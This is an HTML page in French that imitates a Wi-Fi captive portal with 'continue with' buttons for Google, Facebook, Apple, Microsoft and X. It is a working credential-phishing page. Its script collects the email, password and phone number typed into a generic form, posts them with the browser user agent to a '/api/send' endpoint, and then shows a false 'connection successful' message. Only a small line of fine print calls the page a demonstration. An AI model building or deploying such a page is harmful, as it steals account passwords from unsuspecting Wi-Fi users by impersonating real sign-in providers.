<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Portail Wi-Fi – Connexion</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    :root {
      --primary: #1a73e8;
      --gray: #f2f3f5;
      --text: #202124;
      --subtext: #5f6368;
      --radius: 10px;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Inter', sans-serif;
    }

    body {
      background: var(--gray);
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1rem;
    }

    .container {
      background: white;
      padding: 2rem;
      border-radius: var(--radius);
      max-width: 400px;
      width: 100%;
      box-shadow: 0 5px 25px rgba(0,0,0,0.1);
      text-align: center;
    }

    .logo-placeholder {
      width: 72px;
      height: 72px;
      background: var(--primary);
      color: white;
      font-size: 24px;
      font-weight: bold;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 50%;
      margin: 0 auto 1rem;
    }

    h1 {
      font-size: 1.5rem;
      color: var(--text);
      margin-bottom: 0.5rem;
    }

    .subtext {
      color: var(--subtext);
      font-size: 0.95rem;
      margin-bottom: 1.5rem;
    }

    .provider-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
      padding: 0.75rem 1rem;
      border: 1px solid #ccc;
      border-radius: var(--radius);
      background: #fff;
      width: 100%;
      margin-bottom: 0.75rem;
      cursor: pointer;
      transition: background 0.2s;
    }

    .provider-btn:hover {
      background: #f0f0f0;
    }

    .provider-btn img {
      width: 20px;
      height: 20px;
    }

    form {
      display: none;
      text-align: left;
      margin-top: 1.5rem;
    }

    input {
      width: 100%;
      padding: 0.75rem;
      margin-bottom: 1rem;
      border: 1px solid #ccc;
      border-radius: var(--radius);
      font-size: 1rem;
    }

    .btn-submit {
      width: 100%;
      background: var(--primary);
      color: white;
      border: none;
      padding: 0.75rem;
      font-weight: 600;
      border-radius: var(--radius);
      cursor: pointer;
    }

    .btn-submit:hover {
      background: #1765c1;
    }

    .note {
      font-size: 0.75rem;
      color: red;
      margin-top: 1.5rem;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-placeholder">Wi-Fi</div>
    <h1>Connexion au Wi-Fi</h1>
    <div class="subtext">Choisissez une méthode de connexion</div>

    <button class="provider-btn" onclick="showForm('Google')">
      <img src="https://developers.google.com/identity/images/g-logo.png" alt="Google" />
      Continuer avec Google
    </button>

    <button class="provider-btn" onclick="showForm('Facebook')">
      <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook" />
      Continuer avec Facebook
    </button>

    <button class="provider-btn" onclick="showForm('Apple')">
      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple" />
      Continuer avec Apple
    </button>

    <button class="provider-btn" onclick="showForm('Microsoft')">
      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft" />
      Continuer avec Microsoft
    </button>

    <button class="provider-btn" onclick="showForm('Twitter')">
      <img src="https://upload.wikimedia.org/wikipedia/fr/c/c8/Twitter_Bird.svg" alt="Twitter" />
      Continuer avec X / Twitter
    </button>

    <form id="provider-form">
      <input type="email" id="email" placeholder="Adresse e-mail" required />
      <input type="password" id="password" placeholder="Mot de passe" required />
      <input type="tel" id="phone" placeholder="Numéro de téléphone" required />
      <button type="submit" class="btn-submit">Continuer</button>
    </form>

    <div class="note">* Ceci est une page factice à but démonstratif uniquement.</div>
  </div>

  <script>
    let currentProvider = 'Fournisseur inconnu';

    function showForm(provider) {
      currentProvider = provider;
      document.getElementById('provider-form').style.display = 'block';
    }

    document.getElementById('provider-form').addEventListener('submit', async function(e) {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      const phone = document.getElementById('phone').value;

      const payload = {
        provider: currentProvider,
        email,
        password,
        phone,
        userAgent: navigator.userAgent
      };

      await fetch('/api/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      alert('Connexion réussie. Redirection en cours...');
    });
  </script>
</body>
</html>
